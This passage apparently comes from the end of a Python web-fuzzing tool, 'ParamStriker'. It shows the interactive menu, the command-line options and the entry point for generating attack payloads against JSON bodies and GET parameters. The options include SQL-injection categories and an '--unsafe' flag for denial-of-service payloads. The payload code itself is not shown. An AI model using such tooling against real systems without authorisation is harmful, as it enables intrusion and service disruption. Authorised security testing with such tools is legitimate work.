#  Interactive Menu  (default mode when ParamStriker runs with no args)
# ════════════════════════════════════════════════════════════════════════════

_MENU_RULE = "=" * 72

def _print_menu() -> None:
    print(ASCII_BANNER)
    print("  " + SAFETY_NOTICE)
    print()
    print(_MENU_RULE)
    print("   Select mode:")
    print()
    print("    [1]  JSON Body Attack       (all attacks on all body fields)")
    print("    [2]  GET Parameter Attack   (all attacks on all query params)")
    print("    [q]  Quit")
    print(_MENU_RULE)


def _run_attack(orig: Dict[str, Any], *,
                mode: str, out_base: str, safe_mode: bool = True) -> int:
    """Run orchestrator with spinner + nice console output."""
    orch = FuzzingOrchestrator(safe_mode=safe_mode)
    with Spinner(f"Generating {mode.upper()} payloads"):
        payloads = orch.generate(orig)

    if mode == "query":
        with Spinner("Re-rendering payloads as query strings"):
            payloads = transform_payloads_to_query(payloads)

    # Minimal stats — just the total
    print()
    print(f"  [+] Generated {orch.stats.generated:,} payloads "
          f"({orch.stats.deduplicated:,} deduped) "
          f"in {orch.stats.elapsed_seconds:.2f}s")
    print()

    # Export — single .txt file (one payload per line, paste into Burp/ffuf)
    out_file = out_base + ".txt"
    with Spinner("Writing payloads file"):
        Exporter.write_txt(out_file, payloads)
    print(f"      File saved:  {out_file}")
    print(f"                   ({len(payloads):,} payloads, one per line)")
    print()
    return 0


def interactive_menu() -> int:
    """Default mode when ParamStriker is launched without any CLI args."""
    while True:
        _print_menu()
        try:
            choice = input("\n  >  Your choice: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print("\n  Goodbye. — by Mohnad Alshobaili / @Mohnad\n")
            return 0

        if choice in ("q", "quit", "exit"):
            print("\n  Goodbye. — by Mohnad Alshobaili / @Mohnad\n")
            return 0

        if choice == "1":
            print()
            print("  " + "-" * 70)
            print("   [1] JSON Body Attack")
            print("  " + "-" * 70)
            try:
                body = input("\n   Paste the JSON body  (example: {\"email\":\"test@example.com\",\"password\":\"pass123\"})\n   > ").strip()
            except (EOFError, KeyboardInterrupt):
                print(); continue
            try:
                orig = json.loads(body)
                if not isinstance(orig, dict):
                    print("   [!] Body must be a JSON object.")
                    input("\n   Press Enter to continue…")
                    continue
            except json.JSONDecodeError as e:
                print(f"   [!] Invalid JSON: {e}")
                input("\n   Press Enter to continue…")
                continue
            from datetime import datetime
            out = f"paramstriker_json_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            _run_attack(orig, mode="json", out_base=out)

        elif choice == "2":
            print()
            print("  " + "-" * 70)
            print("   [2] GET Parameter Attack")
            print("  " + "-" * 70)
            try:
                qs = input("\n   Paste the query string (e.g. id=1&token=abc):\n   > ").strip()
            except (EOFError, KeyboardInterrupt):
                print(); continue
            if not qs:
                print("   [!] Empty query string.")
                input("\n   Press Enter to continue…")
                continue
            orig = parse_query_string(qs)
            if not orig:
                print("   [!] Could not parse any parameters.")
                input("\n   Press Enter to continue…")
                continue
            from datetime import datetime
            out = f"paramstriker_query_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            _run_attack(orig, mode="query", out_base=out)

        else:
            print(f"   [!] Invalid choice {choice!r}. Pick 1, 2, or q.")

        try:
            input("\n   Press Enter to return to the menu…")
        except (EOFError, KeyboardInterrupt):
            return 0


# ════════════════════════════════════════════════════════════════════════════
#  CLI subcommand for query-string mode (scripted use)
# ════════════════════════════════════════════════════════════════════════════

def cmd_query(args: argparse.Namespace) -> int:
    print(ASCII_BANNER)
    if args.query is None:
        sys.stderr.write("[!] --query QS is required\n")
        return 2
    orig = parse_query_string(args.query)
    if not orig:
        sys.stderr.write("[!] Could not parse any parameters.\n")
        return 2
    return _run_attack(orig, mode="query",
                       out_base=args.out or "paramstriker_query",
                       safe_mode=not args.unsafe)


def build_argparser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        prog="ParamStriker",
        description=f"ParamStriker v{__version__} — offline JSON/Query fuzzing framework. "
                    + SAFETY_NOTICE,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=("Examples:\n"
                '  python Allpdo_v7.py generate --json \'{"email":"a@b.c","token":"x"}\'\n'
                "  python Allpdo_v7.py generate --json-file body.json "
                  "--only PDO Sql,PDO_PARSER --out report\n"
                "  python Allpdo_v7.py generate --json-file body.json "
                  "--unsafe --formats jsonl,csv,md,burp,postman\n"
                "  python Allpdo_v7.py list\n"
                "  python Allpdo_v7.py selftest\n"),
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    g = sub.add_parser("generate", help="generate payloads from a sample JSON body")
    g.add_argument("--json",      help="inline JSON body (the original request)")
    g.add_argument("--json-file", help="path to a JSON file containing the body")
    g.add_argument("--out",       default="allpdo_v7_out",
                   help="output basename (no extension); default 'allpdo_v7_out'")
    g.add_argument("--formats",   default="jsonl,csv,txt,md",
                   help="comma-separated: jsonl,csv,txt,burp,ffuf,md,postman")
    g.add_argument("--postman-url", default="https://example.test/api/endpoint",
                   help="URL used inside the generated Postman collection")
    g.add_argument("--only",     help="comma-separated categories to keep only")
    g.add_argument("--disable",  help="comma-separated categories to skip")
    g.add_argument("--fields",   help="comma-separated field names to target")
    g.add_argument("--search",   help="regex over payload/description/category")
    g.add_argument("--limit",    type=int, help="cap total payloads")
    g.add_argument("--seed",     type=int, default=DEFAULT_RNG_SEED,
                   help="RNG seed (deterministic output)")
    g.add_argument("--unsafe",   action="store_true",
                   help="enable DoS payloads (off by default)")
    g.add_argument("--deep",     action="store_true",
                   help="enable deep-only generators")
    g.add_argument("--head",     type=int, default=10,
                   help="preview first N payloads to stdout")
    g.set_defaults(func=cmd_generate)

    sub.add_parser("list",  help="list registered generators").set_defaults(func=cmd_list)
    sub.add_parser("info",  help="print version + safety info").set_defaults(func=cmd_info)
    sub.add_parser("selftest", help="run embedded self-test").set_defaults(func=cmd_selftest)

    q = sub.add_parser("query", help="GET parameter attack mode (scripted)")
    q.add_argument("--query",  required=True,
                   help="query string, e.g. 'id=1&token=abc'")
    q.add_argument("--out",    default="paramstriker_query",
                   help="output basename (default: paramstriker_query)")
    q.add_argument("--unsafe", action="store_true",
                   help="enable DoS payloads")
    q.set_defaults(func=cmd_query)
    return ap


def main(argv=None):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass
    # No CLI args  →  launch interactive menu (default mode).
    # CLI args     →  argparse subcommands (generate/query/list/info/selftest).
    if (argv is None and len(sys.argv) == 1) or (argv == []):
        return interactive_menu()
    ap = build_argparser()
    args = ap.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
